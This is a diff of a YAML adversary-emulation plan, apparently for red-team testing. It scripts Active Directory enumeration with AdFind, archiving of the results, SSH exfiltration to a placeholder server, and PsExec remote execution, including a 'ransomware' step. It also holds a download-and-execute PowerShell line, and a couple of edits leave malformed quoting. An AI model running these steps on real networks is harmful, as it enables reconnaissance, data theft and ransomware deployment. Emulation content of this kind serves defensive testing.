@@ -49,7 +49,7 @@
       get_prereq_command: |
         $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
         IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
+        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" #{adfind_zip_hash}) {
         Expand-Archive $zippath $parentpath\adfind -Force
         Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
         Remove-Item $zippath, $parentpath\adfind -Recurse
@@ -57,7 +57,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -f (objectcategory=person) > ad_users.txt"
+        "#{adfind_exe}" -f (objectcategory=person) > ad_users.txt
 
 - id: 5b24eef2-7a7f-4d34-8cab-e588074c59bc
   name: Enumerate AD computer objects
@@ -73,7 +73,7 @@
     windows:
       cmd:
         command: |
-          adfind.exe -f (objectcategory=computer) > ad_computers.txt
+          "adfind.exe -f (objectcategory=computer) > ad_computers.txt"
         payloads: 
         - adfind.exe
 
@@ -107,7 +107,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -f (objectcategory=computer) > ad_computers.txt"
+        "#{adfind_exe}" -f (objectcategory=computer) > ad_computers.txt
 
 - id: d30692dd-779f-4a40-b947-de23dabbb033
   name: Enumerate AD Organizational Units
@@ -158,7 +158,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt"
+        "#{adfind_exe}" -f (objectcategory=organizationalUnit) > ad_ous.txt
 
 - id: 02a96c18-f700-482d-88a8-bd311f6c41dc
   name: Enumerate AD trust objects
@@ -209,7 +209,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt"
+        "#{adfind_exe}" -gcb -sc trustdmp > ad_trustdmp.txt
 
 - id: e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c
   name: Enumerate AD subnets
@@ -260,7 +260,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt"
+        "#{adfind_exe}" -subnets -f (objectCategory=subnet) > ad_subnets.txt
 
 - id: 2738b811-a360-4a4f-af9d-704343ebab4d
   name: Enumerate AD groups
@@ -311,7 +311,7 @@
   executors:
     - name: command_prompt
       command: |
-        "adfind.exe -f (objectcategory=group) > ad_group.txt"
+        "#{adfind_exe}" -f (objectcategory=group) > ad_group.txt
 
 # Phase 1: Privilege Escalation
 
@@ -470,7 +470,7 @@
   executors:
     - name: command_prompt
       command: |
-        "7.exe a -mx3 ad.7z ad_*"
+        "#{7_exe}" a -mx3 ad.7z ad_*"
 
 # Phase 1/2: Exfiltration
 
@@ -533,7 +533,7 @@
   executors:
     - name: command_prompt
       command: |
-        putty.exe -ssh #{user}@#{exfil_server}
+        "#{putty_exe}" -ssh #{user}@#{exfil_server}
 
 # Phase 2: Execution - Point of Sale (POS)
 
@@ -585,7 +585,7 @@
     - name: powershell
       elevation_required: false
       command: |
-        #{psexec_exe} \\#{remote_host} #{remote_command}
+        "#{psexec_exe}" \\#{remote_host} #{remote_command}
 
 - id: 661efd66-d876-41de-88ee-ba9ec4328154
   name: WMIC Remote Process Execution
@@ -1034,8 +1034,14 @@
       cmd:
         command: |
           start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+        payloads:
+        - psexec.exe
 
   input_arguments:
+    psexec_exe:
+      description: Path to Psexec
+      type: string
+      default: "C:\\PSTools\\PsExec.exe"    
     internal_IP:
       description: Hostname or IP address
       type: string
@@ -1054,7 +1060,7 @@
     - name: command_prompt
       elevation_required: true
       command: |
-        start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+        start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
 
 - id: d77838f6-d562-3480-ad29-2cbeee8b7b45
   name: Execute Ransomware via PsExec
@@ -1071,8 +1077,14 @@
       cmd:
         command: |
           start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+        payloads:
+        - psexec.exe
 
   input_arguments:
+    psexec_exe:
+      description: Path to Psexec
+      type: string
+      default: "C:\\PSTools\\PsExec.exe"
     internal_IP:
       description: Hostname or IP address
       type: string
@@ -1088,4 +1100,4 @@
     - name: command_prompt
       elevation_required: true
       command: |
-        start psexec.exe \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+        start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
